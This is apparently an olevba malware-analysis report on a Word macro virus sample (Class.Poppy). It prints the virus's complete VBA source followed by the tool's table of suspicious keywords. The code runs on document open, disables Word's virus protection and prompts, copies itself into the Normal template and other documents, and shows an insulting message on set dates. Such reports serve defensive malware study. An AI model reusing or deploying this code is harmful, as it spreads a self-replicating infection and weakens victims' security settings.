olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ew-a73e70da46add75b2018e5a7eff469af45fe9c9d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ew-a73e70da46add75b2018e5a7eff469af45fe9c9d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
On Error GoTo out
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
Options.VirusProtection = False
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
Options.SaveNormalPrompt = False
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
Options.ConfirmConversions = False
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If nt < 70 Then
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End If
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
With host.codemodule
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    For x = 1 To 4
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    .deletelines 1
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Next x
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End With
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If nt < 70 Then
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    With host.codemodule
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline 1, "Sub AutoClose()"
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline 71, "Sub ToolsMacro()"
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    End With
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End If
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
With host.codemodule
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    For x = 2 To 72 Step 2
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Next x
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End With
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
out:
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End Sub
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
Sub ViewVBCode()
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End Sub
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
